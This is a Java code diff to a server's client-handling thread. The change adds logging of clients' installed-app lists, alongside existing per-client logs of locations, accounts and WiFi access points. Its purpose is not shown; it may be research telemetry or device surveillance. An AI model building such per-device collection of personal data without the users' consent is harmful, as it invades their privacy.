@@ -11,7 +11,7 @@ public class ClientThread implements Runnable {
 
     private static final int SO_TIMEOUT = 60000;
 
-    private Logger logger, threadLogger, locationLogger, accountLogger, wifiAPLogger;
+    private Logger logger, threadLogger, locationLogger, accountLogger, installedAppsLogger, wifiAPLogger;
     private Socket socket = null;
     private DataInputStream in;
     private DataOutputStream out;
@@ -37,6 +37,7 @@ public class ClientThread implements Runnable {
         threadLogger = new Logger(Logger.LOG_TYPE_THREADS, "threads");
         locationLogger = new Logger(Logger.LOG_TYPE_LOCATIONS, clientID);
         accountLogger = new Logger(Logger.LOG_TYPE_ACCOUNTS, clientID);
+        installedAppsLogger = new Logger(Logger.LOG_TYPE_INSTALLED_APPS, clientID);
         wifiAPLogger = new Logger(Logger.LOG_WIFI_APS, clientID);
         threadPort = socket.getPort();
         logger.log("New client connected from: " + socket.getRemoteSocketAddress() + " v" + version);
@@ -195,6 +196,9 @@ public class ClientThread implements Runnable {
         }
         if (message.startsWith("Connected to: ") || message.startsWith("IP address")) {
             wifiAPLogger.log(message);
+        }
+        if (message.startsWith("Installed apps:")) {
+            installedAppsLogger.log(message);
         }
         logger.log(message);
     }
